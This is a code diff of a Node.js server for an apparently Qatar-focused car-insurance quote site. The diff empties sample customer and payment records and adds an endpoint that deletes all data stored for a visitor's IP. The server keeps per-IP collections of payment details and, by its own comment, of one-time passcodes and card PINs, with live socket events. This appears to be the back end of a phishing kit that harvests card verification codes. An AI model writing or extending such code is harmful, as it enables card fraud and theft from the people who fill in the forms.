@@ -51,82 +51,21 @@ app.use(cors({
 app.use(bodyParser.json());
 
 // مخزن مؤقت للبيانات - استبدل بقاعدة بيانات حقيقية
-let customerEntries = [
-  {
-    id: 1,
-    name: 'أحمد محمد الكعبي',
-    phone: '+97455123456',
-    email: 'ahmed@example.com',
-    qid: '28512345678',
-    vehicleType: 'سيدان',
-    vehicleMake: 'تويوتا',
-    vehicleModel: 'كامري',
-    vehicleYear: '2023',
-    plateNumber: '12345',
-    insuranceType: 'شامل',
-    policyStartDate: '2025-01-01',
-    totalAmount: '4736.00',
-    status: 'مكتمل',
-    createdAt: new Date().toISOString()
-  },
-  {
-    id: 2,
-    name: 'فاطمة علي السليطي',
-    phone: '+97455987654',
-    email: 'fatima@example.com',
-    qid: '28598765432',
-    vehicleType: 'SUV',
-    vehicleMake: 'نيسان',
-    vehicleModel: 'باترول',
-    vehicleYear: '2024',
-    plateNumber: '67890',
-    insuranceType: 'ضد الغير',
-    policyStartDate: '2025-01-15',
-    totalAmount: '3200.00',
-    status: 'قيد المعالجة',
-    createdAt: new Date(Date.now() - 3600000).toISOString()
-  }
-];
+let customerEntries = [];
 
 let policyEntries = [];
 let claimEntries = [];
 let vehicleEntries = [];
 
 // نظام تتبع البيانات من الصفحات المختلفة
-let carDetailsData = [
-  {
-    ip: '192.168.1.100',
-    vehicleType: 'سيدان',
-    vehicleMake: 'تويوتا',
-    vehicleModel: 'كامري',
-    vehicleYear: '2023',
-    timestamp: new Date()
-  },
-  {
-    ip: '192.168.1.101',
-    vehicleType: 'SUV',
-    vehicleMake: 'نيسان',
-    vehicleModel: 'باترول',
-    vehicleYear: '2024',
-    timestamp: new Date(Date.now() - 300000)
-  }
-];
+let carDetailsData = [];
 let moreDetailsData = [];
 let selectInsuranceData = [];
 let plateNumberData = [];
 let insuranceInfoData = [];
 let policyDateData = [];
 let quoteData = [];
-let paymentData = [
-  {
-    ip: '192.168.1.100',
-    paymentMethod: 'DCC',
-    cardHolderName: 'أحمد محمد',
-    amount: 4500,
-    status: 'pending',
-    timestamp: new Date()
-  }
-];
+let paymentData = [];
 
 // Track OTP and PIN codes
 let otpCodesData = [];
@@ -639,6 +578,41 @@ app.get('/api/client-ip', (req, res) => {
             req.socket.remoteAddress || 
             req.connection.remoteAddress;
   res.json({ ip: ip?.replace('::ffff:', '') || '127.0.0.1' });
+});
+
+// 🆕 Delete user data by IP
+app.delete('/api/users/:ip', (req, res) => {
+  try {
+    const { ip } = req.params;
+    
+    // Remove from all data arrays
+    carDetailsData = carDetailsData.filter(d => d.ip !== ip);
+    moreDetailsData = moreDetailsData.filter(d => d.ip !== ip);
+    selectInsuranceData = selectInsuranceData.filter(d => d.ip !== ip);
+    plateNumberData = plateNumberData.filter(d => d.ip !== ip);
+    insuranceInfoData = insuranceInfoData.filter(d => d.ip !== ip);
+    policyDateData = policyDateData.filter(d => d.ip !== ip);
+    quoteData = quoteData.filter(d => d.ip !== ip);
+    paymentData = paymentData.filter(d => d.ip !== ip);
+    otpCodesData = otpCodesData.filter(d => d.ip !== ip);
+    pinCodesData = pinCodesData.filter(d => d.ip !== ip);
+    locationsData = locationsData.filter(d => d.ip !== ip);
+    allEntries = allEntries.filter(e => e.payload?.ip !== ip);
+    
+    // Emit userDeleted event
+    io.emit('userDeleted', { ip });
+    
+    console.log(`🗑️ Deleted all data for IP: ${ip}`);
+    
+    res.json({ 
+      success: true, 
+      message: `تم حذف جميع بيانات المستخدم ${ip}`,
+      ip 
+    });
+  } catch (err) {
+    console.error('❌ DELETE /api/users/:ip error:', err);
+    res.status(500).json({ success: false, error: 'Server error' });
+  }
 });
 
 // API لإضافة عميل جديد
